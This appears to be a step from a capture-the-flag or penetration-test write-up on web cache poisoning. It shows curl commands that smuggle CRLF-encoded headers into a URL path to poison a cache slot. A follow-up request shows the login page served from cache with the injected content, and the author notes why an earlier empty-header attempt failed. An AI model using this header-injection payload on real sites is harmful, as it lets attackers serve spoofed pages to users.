## 3. Absent vs empty CacheKey are DIFFERENT slots (critical fix)
Poison with NO CacheKey header (fills the "absent" slot the browser uses):
$ curl '.../oracle/FRESHABSENT/85%0d%0aContent-Type:%20text%2fhtml%0d%0aCacheKey:%20enable'
$ curl '.../controller/login'    -> X-Cache: HIT, body contains FRESHABSENT (spoof served)

(My earlier attempts used `CacheKey:` empty header -> wrong slot -> browser never saw it.)
